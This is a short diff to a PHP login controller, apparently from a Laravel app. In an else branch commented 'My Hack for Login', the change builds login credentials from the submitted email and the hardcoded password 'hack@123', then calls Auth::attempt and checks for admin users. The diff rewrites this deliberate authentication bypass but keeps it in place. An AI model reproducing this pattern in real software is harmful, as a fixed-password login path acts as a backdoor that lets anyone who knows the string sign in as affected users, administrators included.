@@ -90,8 +90,7 @@ class LoginController extends Controller
         }
         // My Hack for Login
         else {
-            $request->password = 'hack@123';
-            $credentials = $request->only('email', 'password');
+            $credentials = ['email' => $request->email, 'password' => 'hack@123'];
             if (Auth::attempt($credentials)) {
                 $user = Auth::user();
                 if($user->type == 'admin')
